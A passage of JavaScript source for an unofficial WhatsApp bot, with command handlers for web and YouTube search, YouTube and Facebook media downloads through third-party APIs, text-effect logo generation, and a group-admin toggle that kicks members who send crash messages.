      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . 3davengers
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . 3dstone
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . 3dstone2
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . summertime
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . thunder
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . window
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . graffiti
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . graffitibike
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . pornhub
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . glitch
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . blackpinkart
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . glitch2
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . glitch3
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . 3dspace
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . lion
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . 3dneon
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . greenneon
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . bokeh
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . holographic
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . bear
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . wolf
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . joker
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . dropwater
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . dropwater2
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . thewall
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . neonlight
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . natural
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . carbon
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . pencil
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . blackpink2
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . neon
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . neonlight2
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . toxic
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . strawberry
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . discovery
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . 1917
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 .  sci_fi
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 .  ancient
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 .  fabric
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 .  hoorror
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 .  whitebear
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 .  juice
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 .  batman
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 .  multicolor
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 .  wonderful
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 .  sketch
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 .  marvel
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 .  foggy
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 .  writing
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 .  halloweenfire
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 .  halloween
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 .  watercolor
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 .  classic
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
      
      `,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break

			        case 'google': {
                if (!text) throw `Example : ${prefix + command} fatih arridho`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `${themeemoji} *Title* : ${g.title}\n`
                teks += `${themeemoji} *Description* : ${g.snippet}\n`
                teks += `${themeemoji} *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                m.reply(teks)
                })
                }
                break
case 'video': { 
XeonBotInc.sendMessage(from, { react: { text: `📽️`, key: m.key }})
if (!text) return m.reply(`Example : ${prefix + command} Stay jb`)
            let ytsvideo = require("youtube-yts")
            let videosearch = await ytsvideo(text)
            listSerch = []
            teskd =  `\`\`\`\nSEARCHED VIDEO ${text}\n \`\`\`\n`
            for (let i of videosearch.all) {
                listSerch.push({
                    title: i.title,
                    rowId: `${prefix}ytmp4 ${i.url}`,
                    description: `Duration: ${i.timestamp}`
                })
            }
            let sections = [
                {
                    title: "Top " + videosearch.all.length + " videos thats matches search result",
                    rows: listSerch
                }
            ]
            const listMessage = {
                text: teskd,
                footer: botname,
                title: ``,
                buttonText: "Videos",
                mentions: parseMention(teskd), sections
            }
            return XeonBotInc.sendMessage(m.chat, listMessage, {
                quoted: m
            })
            }
        break    
        case 'play':{
        XeonBotInc.sendMessage(from, { react: { text: `🎶`, key: m.key }})
        if (!text) return m.reply(`Example : ${prefix + command} stay jb`)
            let ytslagu = require("youtube-yts")
            let lagusearch = await ytslagu(text)
            listSerch = []
            teskd =  `\`\`\` SERCHING YOUR SONG ${text}\n \`\`\`\n\n`
            for (let i of lagusearch.all) {
                listSerch.push({
                    title: i.title,
                    rowId: `${prefix}ytmp3 ${i.url}`,
                    description: `Duration: ${i.timestamp}`
                })
            }
            const sections = [
                {
                    title: "Top " + lagusearch.all.length + " songs that matched search result",
                    rows: listSerch
                }
            ]
            const listMessage = {
                text: teskd,
                footer: xdate,
                title: ``,
                buttonText: "Song",
                mentions: parseMention(teskd), sections
            }
            return XeonBotInc.sendMessage(m.chat, listMessage, {
                quoted: m
            })
            }
            break

			case 'song': {
			      XeonBotInc.sendMessage(from, { react: { text: `🎧`, key: m.key }})
if (!text) throw `Example : ${prefix + command} lelena`
let yts = require("youtube-yts")
let search = await yts(text)
let anulay = search.videos[0]
let buttons = [
      {buttonId: `ytmp3 ${anulay.url} 128kbps`, buttonText: {displayText: '🎧 Audio 🎧'}, type: 1},
      {buttonId: `ytdoc ${anulay.url}`, buttonText: {displayText: '📁 Document 📁'}, type: 1}
]
let buttonMessage = {
image: { url: anulay.thumbnail },
caption: `\`\`\`TITLE : ${anulay.title}
                    
Url : ${anulay.url}

Views : ${anulay.views}
Upload At : ${anulay.ago}
Author : ${anulay.author.name}

Description : ${anulay.description} \`\`\`\n\n `,
footer: `${global.botname}`,
buttons: buttons,
headerType: 4
}
XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break


case 'ytdoc': {
 if (!text) return reply(mess.linkm)
 if (!isUrl(args[0]) && !args[0].includes('youtube.com')) return reply(`The link you provided is invalid`)
 anu = await fetchJson(`https://darkalphaxteam-api.cyclic.app/api/download/ytmp3?url=${text}&apikey=DarkNero`)        
 if (anu.filesize_video >= 999999) return reply('File Over Limit '+util.format(anu))
 const docdown = await XeonBotInc.sendText(m.chat, `Im Downloading Your ${m.pushName} Audio ... 🔄`)               
 tummb = await getBuffer(anu.thumb)
 await XeonBotInc.sendMessage(from, { delete: docdown.key })
 const docup = await XeonBotInc.sendText(m.chat, `Im uploding Your ${m.pushName} Audio ... 📤`)     
 const doc = await XeonBotInc.sendMessage(m.chat, {document: {url : anu.download}, mimetype: 'audio/mpeg', fileName: `${anu.title}.mp3`}, { quoted : m }).catch((err) => reply(mess.error))
 await XeonBotInc.sendMessage(from, { delete: docup.key })
            }
           break

case 'ytmp3': case 'ytaudio': 
const xeonaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonaudp3.isYTUrl(text)) throw `Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`
const audio=await xeonaudp3.mp3(text)
XeonBotInc.sendMessage(m.chat, { audio: { url: audio.path }, mimetype: 'audio/mpeg', fileName: `${audio.meta.title}.mp3` }, { quoted: m })
break

	    case 'ytmp3xx': case 'ytaudioxx': {
	    XeonBotInc.sendMessage(from, { react: { text: `✅`, key: m.key }})
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('File Over Limit '+util.format(media))
                XeonBotInc.sendImage(m.chat, media.thumb, `${themeemoji} Title : ${media.title}\n${themeemoji} File Size : ${media.filesizeF}\n${themeemoji} Url : ${isUrl(text)}\n${themeemoji} Ext : MP3\n${themeemoji} Resolution : ${args[1] || '128kbps'}`, m)
                XeonBotInc.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break

case 'ytmp4': case 'ytvideo': //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
const xeonvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text)) throw `Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
const vid=await xeonvidoh.mp4(text)
const ytc=`\`\`\`
Tittle: ${vid.title}
Date: ${vid.date}
Duration:  ${vid.duration}
Quality:  ${vid.quality} \`\`\`\n\n `
await XeonBotInc.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
break
            case 'ytmp4xx': case 'ytvideoxx': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return m.reply('File Over Limit '+util.format(media))
                XeonBotInc.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `${themeemoji} Title : ${media.title}\n${themeemoji} File Size : ${media.filesizeF}\n${themeemoji} Url : ${isUrl(text)}\n${themeemoji} Ext : MP3\n${themeemoji} Resolution : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
			
			            case 'fb' : 
try{
XeonBotInc.sendMessage(m.chat, { react: { text: '💌', key: m.key }})
  if (!text) return reply( `Example : ${prefix + command} link`)
  
    const sdfbdown = await XeonBotInc.sendMessage(m.chat , { text: 'Searched your Facebook video🔎' }, { quoted: m } )
    await XeonBotInc.sendMessage(m.chat, { delete: sdfbdown.key })
    const sdfbup = await XeonBotInc.sendMessage(m.chat , { text: 'Uploading your Video📤' }, { quoted: m } )
    let host = `https://api.akuari.my.id/downloader/fbdl?link=${text}`;
    axios.get(host)
        .then(({ data }) => {
XeonBotInc.sendMessage(m.chat, { video: { url: data.url.url }, caption: '*Queen-x Watsapp user bot🚀*'}, { quoted: m })})
await XeonBotInc.sendMessage(m.chat, { delete: sdfbup.key })
} catch(e) {
    await XeonBotInc.sendMessage(m.chat , { text: '📡NOT FOUND' }, { quoted: m } ) 
   }
break
             break
case'glitch3':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3dbox':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
    `${q}`,])
.then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
.catch((err) => console.log(err));
break

case 'waterdrop':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
 maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
     `${q}`,])
    .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
    .catch((err) => console.log(err));
     break

case 'lion2':
  if(!q) throw `Use ${prefix + command} text`
  m.reply(mess.wait)
  maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
      `${q}`,])
     .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
     .catch((err) => console.log(err));
     break

case 'papercut':
      if(!q) throw `Use ${prefix + command} text`
      m.reply(mess.wait)
      maker.textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [
`${q}`,])
         .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
         .catch((err) => console.log(err));
         break

case 'transformer':
      if(!q) throw `Use ${prefix + command} text`
      m.reply(mess.wait)
      maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [
`${q}`,])
.then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
.catch((err) => console.log(err));
break
   
case 'harrypot':
       if(!q) throw `Use ${prefix + command} text|text`
       m.reply(mess.wait)
       teks1 = q.split("|")[0]
       teks2 = q.split("|")[1]
       maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
 `${teks1}`,`${teks2}`])
 .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
 .catch((err) => console.log(err));
 break

case 'neondevil':
      if(!q) throw `Use ${prefix + command} text`
      m.reply(mess.wait)
      maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
`${q}`,])
         .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
         .catch((err) => console.log(err));
         break

case '3dstone':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3davengers':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-avengers-logo-online-974.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'thunder':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
case 'window':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

   case 'blackpinkneon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-neon-light-blackpink-logo-text-effect-online-1081.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'graffiti':
   case 'grafiti':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'pornhub2':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'blackpink2':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   case 'antivirus': case 'antivirtex': {
XeonBotInc.sendMessage(from, { react: { text: `⛔`, key: m.key }})
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (antiVirtex) return m.reply('Already activated')
ntvirtex.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
m.reply('Success in turning on antivirus in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return m.reply('Already deactivated')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
m.reply('Success in turning off antivirus this group')
} else {
  let buttonsntvirtex = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntvirtex, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break

case 'glitch':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'glitch2':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'glitch3':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3dspace':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'lion':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3dneon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'neon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/neon-text-effect-online-879.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'greenneon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/green-neon-text-effect-874.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
    
case 'bokeh':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
